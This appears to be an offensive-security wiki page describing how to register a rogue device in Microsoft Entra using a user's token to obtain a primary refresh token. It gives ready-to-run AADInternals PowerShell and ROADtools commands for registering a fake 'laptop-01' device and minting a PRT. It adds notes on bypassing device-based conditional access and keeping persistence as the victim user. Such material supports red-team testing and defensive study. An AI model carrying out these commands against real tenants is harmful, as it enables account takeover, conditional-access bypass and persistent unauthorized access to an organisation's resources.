---
title: "Device registration: a rogue device for a PRT"
description: "Registering a rogue device in Entra to obtain a device identity and primary refresh token, satisfying device-based conditional access."
keywords:
  - device registration
  - Azure AD registered
  - PRT
  - device identity
  - conditional access
---

# Device registration

With a user's token you can register a brand-new device object in Entra under their identity. The registered device receives its own key material and a **primary refresh token**, which both gives you durable SSO as the user and makes you a device that device-based conditional access will trust.

## Register a device and get a PRT

```powershell
# AADInternals: join a fake device using the user's token, then mint a PRT
$at = Get-AADIntAccessTokenForAADJoin
Join-AADIntDeviceToAzureAD -DeviceName "laptop-01" -DeviceType "Windows" -AccessToken $at
# use the returned device certificate to request a user PRT
Get-AADIntUserPRTToken
```

```bash
# ROADtools: roadtx registers a device and handles the PRT
roadtx device -a register -n laptop-01
```

## Exploitation notes

- A registered device satisfies "require compliant/registered device" conditional-access policies, bypassing a common control ([conditional access](../authentication/conditional-access.md)).
- The device PRT is durable persistence as the user until the device is removed.
- Registration (vs join) usually needs only a valid user token, with no admin rights, if device registration is open (the default in many tenants).

## Tools

- **AADInternals** (`Join-AADIntDeviceToAzureAD`).
- **ROADtools** (`roadtx device`).

## References

- [dirkjanm.io: device registration and PRTs](https://dirkjanm.io/)
- [AADInternals: device join](https://aadinternals.com/aadinternals/)
- [ROADtools](https://github.com/dirkjanm/ROADtools)
